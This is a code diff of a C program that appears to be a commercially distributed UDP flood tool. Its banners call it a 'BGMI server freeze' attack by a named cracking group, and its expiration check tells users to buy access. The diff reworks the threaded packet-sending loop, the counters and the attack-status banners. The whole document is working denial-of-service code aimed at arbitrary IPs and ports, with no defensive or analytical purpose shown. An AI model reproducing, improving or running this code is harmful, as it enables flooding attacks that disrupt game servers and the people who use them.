@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -22,11 +23,8 @@
 char *ip;
 int port;
 int duration;
-int threads;
 char padding_data[2 * 1024 * 1024];
 volatile sig_atomic_t stop_flag = 0;
-unsigned long packets_sent = 0;
-unsigned long packets_failed = 0;
 
 unsigned long calculate_crc32(const char *data) {
     return crc32(0, (const unsigned char *)data, strlen(data));
@@ -40,10 +38,14 @@ void check_expiration() {
     expiration_date.tm_mday = EXPIRATION_DAY;  
     time(&now);   
     if (difftime(now, mktime(&expiration_date)) > 0) {
-        fprintf(stderr, "❌ THIS FILE HAS EXPIRED ❌\nContact @RARExxOWNER to reactivate. 🌐\n");
+        fprintf(stderr, "THIS FILE IS CLOSED BY RARE DM TO BUY FILE @RARExxOWNER.\nJOIN CHANNEL TO USE THIS FILE AND CHANNEL AND FILE OWNER IS RARECRACKS.\n");
         exit(EXIT_FAILURE);
     }
 }
+
+long packets_sent = 0;
+long packets_failed = 0;
+char *payloads[] = {"UDP traffic test"};  // Example payload, adjust based on your actual use case
 
 void *send_udp_traffic(void *arg) {
     int sock;
@@ -52,26 +54,26 @@ void *send_udp_traffic(void *arg) {
     int sent_bytes;
     cpu_set_t cpuset;
     
-    CPU_ZERO(&cpuset);  // Initialize CPU set
-    CPU_SET(sched_getcpu(), &cpuset);  // Set current CPU
+    CPU_ZERO(&cpuset);
+    CPU_SET(sched_getcpu(), &cpuset);
     if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
-        perror("❌ Thread CPU affinity failed");
+        perror("pthread_setaffinity_np failed");
         pthread_exit(NULL);
     }
 
     if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
-        perror("❌ Socket creation failed");
+        perror("Socket creation failed");
         pthread_exit(NULL);
     }
 
     int flags = fcntl(sock, F_GETFL, 0);
     if (flags < 0) {
-        perror("❌ fcntl F_GETFL failed");
+        perror("fcntl F_GETFL failed");
         close(sock);
         pthread_exit(NULL);
     }
     if (fcntl(sock, F_SETFL, flags | O_NONBLOCK) < 0) {
-        perror("❌ fcntl F_SETFL failed");
+        perror("fcntl F_SETFL failed");
         close(sock);
         pthread_exit(NULL);
     }
@@ -80,38 +82,38 @@ void *send_udp_traffic(void *arg) {
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(port);
     if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
-        perror("❌ Invalid address");
+        perror("Invalid address/ Address not supported");
         close(sock);
         pthread_exit(NULL);
     }
 
-    snprintf(buffer, sizeof(buffer), "🔥 UDP Traffic Test");
+    snprintf(buffer, sizeof(buffer), "%s", payloads[0]);
     time_t start_time = time(NULL);
     time_t end_time = start_time + duration;
 
-    // Display the initial message once and then update the remaining time in the same line
+    // Track and update remaining time
     while (time(NULL) < end_time && !stop_flag) {
         sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
                             (struct sockaddr *)&server_addr, sizeof(server_addr));
         if (sent_bytes < 0) {
             if (errno != EAGAIN && errno != EWOULDBLOCK) {
-                perror("❌ Send failed");
+                packets_failed++;
+                perror("Send failed");
                 break;
             }
+        } else {
+            packets_sent++;
         }
-        packets_sent++;
 
-        // Update the remaining time in the same line (single message)
-        time_t remaining_time = end_time - time(NULL);
-        printf("\r⏳ REMAINING TIME FOR ATTACK: %ld SECONDS   ", remaining_time); // overwrite the line
+        // Print remaining time
+        printf("⏳ REMAINING TIME FOR ATTACK: %d SECONDS\r", duration - (int)(time(NULL) - start_time));
         fflush(stdout);
-        usleep(1000000);  // Sleep for 1 second
+        sleep(1);  // Update every second
     }
 
     if (close(sock) < 0) {
-        perror("❌ Failed to close socket");
+        perror("Failed to close socket");
     }
-    printf("\n");  // Move to the next line after the attack finishes
     pthread_exit(NULL);
 }
 
@@ -127,66 +129,48 @@ void signal_handler(int signum) {
     stop_flag = 1;
 }
 
-void display_attack_start() {
-    printf("\n✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦\n");
-    printf("🌊🌊🌊 ATTACK BY @RARExxOWNER 🌊🌊🌊\n");
-    printf("🎯 TARGETING IP: %s\n", ip);
-    printf("📍 TARGET PORT: %d\n", port);
-    printf("⏳ ATTACK DURATION: %d SECONDS\n", duration);
-    printf("💥 THREADS: %d\n", threads);
-    printf("⚡ METHOD: BGMI SERVER FREEZE BY RARECRACKS TEAM ⚡\n");
-    printf("✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦\n");
-}
-
-void display_attack_summary() {
-    unsigned long data_in_kb = (packets_sent * strlen("UDP traffic test")) / 1024;
-    double data_in_gb = (packets_sent * strlen("UDP traffic test")) / 1024.0 / 1024.0 / 1024.0;
-
-    printf("\n────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──\n");
-    printf("🎉 SCRIPT CODED BY @RARECRACKS 🎉\n");
-    printf("💻 OWNER = @RARExxOWNER 💻\n");
-    printf("✨ ATTACK FINISHED: ✨\n");
-    printf("✅ PACKETS SENT: %ld\n", packets_sent);
-    printf("✅ SUCCESSFUL PACKETS: %ld\n", packets_sent - packets_failed);
-    printf("❌ FAILED PACKETS: %ld\n", packets_failed);
-    printf("📦 DATA DELIVERED: %ld KB\n", data_in_kb);
-    printf("📦 DATA DELIVERED (IN GB): %.2f GB\n", data_in_gb);
-    printf("────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──\n");
-}
-
 int main(int argc, char *argv[]) {
-
     if (signal(SIGINT, signal_handler) == SIG_ERR) {
-        perror("❌ Signal setup failed");
+        perror("signal setup failed");
         exit(EXIT_FAILURE);
     }
 
     if (argc != 5) {
-        fprintf(stderr, "❌ Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
+        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
         exit(EXIT_FAILURE);
     }
 
     ip = argv[1];
     port = atoi(argv[2]);
     duration = atoi(argv[3]);
-    threads = atoi(argv[4]);
-
-    // Display initial watermark message when attack starts
-    display_attack_start();
+    int threads = atoi(argv[4]);
 
     check_expiration();
+
+    // Display initial watermark message
+    printf("✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦\n");
+    printf("🌊🌊🌊 ATTACK BY @RARExxOWNER 🌊🌊🌊\n");
+    printf("🎯 TARGETING IP: %s\n", ip);
+    printf("📍 TARGET PORT: %d\n", port);
+    printf("⏳ ATTACK DURATION: %d SECONDS\n", duration);
+    printf("💥 THREADS: %d\n", threads);
+    printf("⚡ METHOD: BGMI SERVER FREEZE BY RARECRACKS TEAM ⚡\n");
+    printf("✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦\n");
+
+    memset(padding_data, 0, sizeof(padding_data));
+    unsigned long crc = calculate_crc32("RAREOWNER");
 
     pthread_t tid[threads];
     pthread_t exp_tid;
 
     if (pthread_create(&exp_tid, NULL, expiration_check_thread, NULL) != 0) {
-        perror("❌ Expiration check thread creation failed");
+        perror("Expiration check thread creation failed");
         exit(EXIT_FAILURE);
     }
 
     for (int i = 0; i < threads; i++) {
         if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
-            perror("❌ Thread creation failed");
+            perror("Thread creation failed");
             stop_flag = 1;
             for (int j = 0; j < i; j++) {
                 pthread_cancel(tid[j]);
@@ -205,8 +189,17 @@ int main(int argc, char *argv[]) {
     stop_flag = 1;
     pthread_join(exp_tid, NULL);
 
-    // Display the attack summary after completion
-    display_attack_summary();
+    // After attack finishes, show final results
+    printf("────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──\n");
+    printf("🎉 SCRIPT CODED BY @RARECRACKS 🎉\n");
+    printf("💻 OWNER = @RARExxOWNER 💻\n");
+    printf("✨ ATTACK FINISHED: ✨\n");
+    printf("✅ PACKETS SENT: %ld\n", packets_sent);
+    printf("✅ SUCCESSFUL PACKETS: %ld\n", packets_sent - packets_failed);
+    printf("❌ FAILED PACKETS: %ld\n", packets_failed);
+    printf("📦 DATA DELIVERED: %ld KB\n", (packets_sent * strlen(payloads[0])) / 1024);
+    printf("📦 DATA DELIVERED (IN GB): %.2f GB\n", (packets_sent * strlen(payloads[0])) / 1024.0 / 1024.0 / 1024.0);
+    printf("────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──\n");
 
     return 0;
 }
